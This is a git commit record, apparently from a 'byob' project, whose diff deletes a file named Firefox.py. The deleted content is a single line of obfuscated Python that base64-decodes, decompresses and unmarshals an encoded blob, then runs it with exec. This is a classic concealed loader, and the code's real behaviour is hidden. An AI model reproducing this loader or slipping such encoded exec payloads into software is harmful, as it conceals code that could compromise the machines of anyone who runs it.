114b39e157d32762220913cee2132507085e30db
colental <colental@github.com>
2018-06-13 09:31:45 -0700

    06-12-18

--- byob/Firefox.py
+++
@@ -1,1 +0,0 @@
-import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode('eJwti0EKwjAQRXMUd00hTEhbQqwrT+AZkmawhdSEmQjqWTysLfVvPjze468QYllLpnr6pCWo4BntoFZPPPuknpQ2esEXTvLPIGUfWe42RJzyWgiZ5RFCsMMOI8ojhe1ywYds5lrLqLU5d2CsAwPd4EbT905rrv6OxHq53qC8mxYIfZTtvh/QSTU9'))))
